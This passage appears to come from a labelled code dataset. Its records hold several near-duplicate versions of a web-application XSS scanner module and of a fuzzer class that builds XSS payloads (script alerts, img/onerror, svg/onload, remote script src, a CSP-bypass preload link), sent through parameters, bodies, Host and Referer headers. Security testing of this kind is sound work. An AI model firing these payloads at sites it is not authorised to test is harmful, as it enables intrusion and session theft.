dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "9d52656d839d6a97eeca12578ca127318a367e00", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'https://github.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "bc18f1148918f6cef38f2d7f575482dc43575b7b", "code": "saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 0}, {"id": "bc18f1148918f6cef38f2d7f575482dc43575b7b", "code": "/saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        payload = \"<img src='%s'></img>\" % self.url\n        return payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 1}, {"id": "47abf048e510b5be0118d7fc390d0f0202040bca", "code": "saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    